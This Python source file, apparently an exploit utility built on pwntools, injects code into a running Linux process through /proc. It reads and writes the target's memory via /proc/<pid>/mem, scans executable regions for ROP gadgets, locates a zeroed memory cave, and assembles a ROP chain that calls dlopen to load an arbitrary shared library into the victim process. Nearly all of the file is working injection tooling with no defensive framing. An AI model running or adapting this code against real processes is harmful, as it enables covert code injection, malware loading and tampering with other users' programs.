import os
from pwn import *

page_size = 4096

# memory-related and relevant procfs virtual files
PROC_MAPS = "/proc/{}/maps"
PROC_MEM = "/proc/{}/mem"
PROC_SYSCALL = "/proc/{}/syscall"
LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"


class ExploitUtils:
    def __init__(self, pid):
        self.pid = pid
        self.memory_map = self._parse_maps()

        # gadgets
        self.nop = b"\x90\xc3"  # nop; ret;
        self.jmp_rax = b"\xff\xe0"  # jmp rax;
        self.pop_rsi = b"\x5e\xc3"  # pop rsi; ret;
        self.pop_rdi = b"\x5f\xc3"  # pop rdi; ret;
        self.pop_rax = b"\x58\xc3"  # pop rax; ret;

        self.gadget_list = {
            "nop": self.nop,
            "jmp_rax": self.jmp_rax,
            "pop_rsi": self.pop_rsi,
            "pop_rdi": self.pop_rdi,
            "pop_rax": self.pop_rax,
        }

    def _parse_maps(self):
        """
        Parse the /proc/<pid>/maps file and store the relevant information in a list of dictionaries.
        """
        memory_map = []

        with open(PROC_MAPS.format(self.pid), "r") as file:
            maps_data = file.read().split("\n")[:-1]

        for entry in maps_data:
            parsed_entry = self._parse_maps_entry(entry)
            memory_map.append(parsed_entry)

        return memory_map

    def _parse_maps_entry(self, mapped_entry: str) -> dict:
        """
        Parse a single entry from the /proc/<pid>/maps file.
        """
        parsed = {}
        split_entry = mapped_entry.split(" ")
        parsed['name'] = split_entry[-1]
        addresses = split_entry[0].split("-")
        parsed['start'] = addresses[0]
        parsed['end'] = addresses[1]
        parsed['perms'] = split_entry[1]
        return parsed

    def get_entry_size(self, maps_entry: dict) -> int:
        """
        Calculate the size of a memory region from a /proc/<pid>/maps entry.
        """
        map_start = "0x" + maps_entry["start"]
        map_end = "0x" + maps_entry["end"]
        map_size = int(map_end, 16) - int(map_start, 16)
        return map_size

    def read_memory(self, address: int, num_bytes: int):
        """
        Read memory from the target process at the specified address.
        """
        with open(PROC_MEM.format(self.pid), 'rb') as mem_file:
            mem_file.seek(address)
            return mem_file.read(num_bytes)

    def write_memory(self, address: int, content: bytes):
        """
        Write memory to the target process at the specified address.
        """
        with open(PROC_MEM.format(self.pid), 'wb') as mem_file:
            mem_file.seek(address)
            mem_file.write(content)

    def find_gadgets(self, gadgets: dict):
        """
        Find multiple gadgets in the memory map and return their addresses.

        :param gadgets: A dictionary where the keys are gadget names and values are their corresponding byte sequences.
        :return: A dictionary with gadget names as keys and their found addresses as values.
        """
        found_gadgets = {}

        for gadget_name, gadget_bytes in gadgets.items():
            log.info(f"finding: {gadget_name}")
            gadget_addr = self.find_gadget(gadget_bytes, gadget_name)

            if gadget_addr != -1:
                # Only log the gadget found once here
                found_gadgets[gadget_name] = gadget_addr

        return found_gadgets

    def find_gadget(self, gadget: bytes, gadget_name: str) -> int:
        """
        Search for a specific byte sequence (gadget) within executable memory regions.
        """
        for entry in self.memory_map:
            if entry["perms"] == "r-xp":  # Focus on executable memory regions
                map_start = int(entry["start"], 16)
                map_size = self.get_entry_size(entry)

                try:
                    mapped_memory = self.read_memory(map_start, map_size)
                except Exception as e:
                    print(f"[-] error reading memory: {e}")
                    continue

                offset = mapped_memory.find(gadget)
                if offset != -1:
                    gadget_addr = offset + map_start
                    log.info(f"found {gadget_name}! => {hex(gadget_addr)}")
                    return gadget_addr

        log.warning(f"[-] gadget {gadget_name} not found.")
        return -1

    def find_cave(self, cave_size: int) -> int:
        """
        Search for a contiguous block of zeroed-out memory (a "cave") of the specified size.
        """
        rw_p_addrs = [entry for entry in self.memory_map if entry["perms"] == "rw-p"]
        if not rw_p_addrs:
            print("[-] didn't find any rw-p entries in the memory map")
            return -1

        for rw_p_info in rw_p_addrs:
            rw_p_start = int(rw_p_info["start"], 16)
            rw_p_end = int(rw_p_info["end"], 16)

            rw_p_memory = self.read_memory(rw_p_start, rw_p_end - rw_p_start)

            for offset in range(len(rw_p_memory) - cave_size + 1):
                cave_candidate = rw_p_memory[offset:offset + cave_size]

                if all(byte == 0 for byte in cave_candidate):
                    bss_cave = rw_p_start + offset
                    log.success(f"found bss cave at: {hex(bss_cave)}")
                    return bss_cave

        print("[-] didn't find any bss cave :(")
        return -1

    def parse_proc_syscall(self):
        """
        Parse the /proc/<pid>/syscall file and return a syscallinfo object.
        """
        syscall_file = PROC_SYSCALL.format(self.pid)

        try:
            with open(syscall_file, 'r') as f:
                content = f.read().strip()

            values = content.split()

            syscall_num = int(values[0], 16)
            rdi = int(values[1], 16)
            rsi = int(values[2], 16)
            rdx = int(values[3], 16)
            r10 = int(values[4], 16)
            r8 = int(values[5], 16)
            r9 = int(values[6], 16)
            rsp = int(values[7], 16)
            rip = int(values[8], 16)

            return SyscallInfo(syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip)

        except FileNotFoundError:
            print(f"[-] {syscall_file} not found")
            return None
        except Exception as e:
            print(f"[-] error parsing syscall file: {e}")
            return None

    def locate_dlopen(self, libc_base: int) -> int:
        """
        Find the address of the dlopen function in the target libc.
        """
        libc = ELF(path=LIBC_PATH, checksec=False)
        libc.address = libc_base
        dlopen_addr = libc.symbols["dlopen"]
        log.info(f"dlopen offset in libc: {hex(dlopen_addr)}")
        return dlopen_addr

    def dl_open_rop(self, address: int, so_path: str, user_gadgets=None):
        """
        Construct a ROP chain to call dlopen with the specified address and shared object path.
        User can provide a dictionary of custom gadgets.
        """
        libc_entry = next(
            (entry for entry in self.memory_map if 'libc.so.6' in entry["name"] and entry["perms"] == "r--p"), None)

        if libc_entry is None:
            print(f"[-] didn't find libc.so.6 base address...")
            return None

        libc_base = int(libc_entry["start"], 16)
        dlopen_addr = self.locate_dlopen(libc_base=libc_base)

        gadgets_to_find = user_gadgets if user_gadgets else self.gadget_list

        found_gadgets = self.find_gadgets(gadgets=gadgets_to_find)

        rop_chain = (
                found_gadgets["pop_rax"].to_bytes(8, byteorder="little") +
                p64(dlopen_addr) +
                found_gadgets["pop_rdi"].to_bytes(8, byteorder="little") +
                p64(address + 0x46) +
                found_gadgets["pop_rsi"].to_bytes(8, byteorder="little") +
                p64(os.RTLD_LAZY) +
                found_gadgets["jmp_rax"].to_bytes(8, byteorder="little") +
                so_path.encode()
        )

        return rop_chain


class SyscallInfo:
    def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
        self.syscall_num = syscall_num
        self.rdi = rdi
        self.rsi = rsi
        self.rdx = rdx
        self.r10 = r10
        self.r8 = r8
        self.r9 = r9
        self.rsp = rsp
        self.rip = rip
